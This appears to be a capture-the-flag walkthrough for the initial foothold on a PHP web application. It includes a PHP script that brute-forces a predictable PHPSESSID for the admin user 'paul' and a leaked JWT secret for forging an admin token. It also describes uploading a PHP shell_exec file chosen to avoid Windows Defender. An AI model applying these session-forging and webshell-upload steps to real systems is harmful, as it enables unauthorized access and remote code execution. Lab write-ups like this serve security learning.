# Getting initial reverse shell as www-data
## Generating cookie for paul as admin user to upload files
Note: Only paul as admin user can upload files and access file upload page. Cookie is composed of two portions `PHPSESSID` and `JWT Token`.
Source code for generating `PHPSESSID` portion of  cookie is.
```php
<?php
\/**
 * @param string $username  Username requesting session cookie
 *
 * @return string $session_cookie Returns the generated cookie
 *
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * *\/
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
```
We can write php script to generate `PHPSESSID` portion of cookie for paul.
```php
<?php
$name = "paul";
function makesession($username,$seed){
    $max = strlen($username) - 1;
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
for($i = 0;$i < strlen($name); $i++){
    echo makesession($name,$i). "\xA";
}
```
Which gives following `PHPSESSID`.
```bash
paula2a6a014d3bee04d7df8d5837d62e8c5
paul61ff9d4aaefe6bdf45681678ba89ff9d
paul8c8808867b53c49777fe5559164708c3
paul47200b180ccd6835d25d034eeb6e6390
```
We also need JWT token as paul cookie which can be generated via following website having secret key as `6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e`(found in `portal/includes/filecontroller.php`). Webiste for generating [JWT Token](https://jwt.io/).
![[Pasted image 20210730114707.png]]
## Logging in as  paul admin and accessing file upload page
Logged in as paul admin user using paul cookie.
![[Pasted image 20210730115238.png]]
Only paul ad admin user can access file upload page , normal user will be redirected to index page. So file upload page is.
![[Pasted image 20210730115450.png]]
## Uploading php file to execute system commands
In php file to be uploaded for Remote Code Execution, `shell_exec` command will be used instead of `SYSTEM` command as `SYSTEM` command will flagged by Windows Defender.
![[Pasted image 20210730115851.png]]
File which was uploaded has reflected in uploads folder.
![[Pasted image 20210730120009.png]]

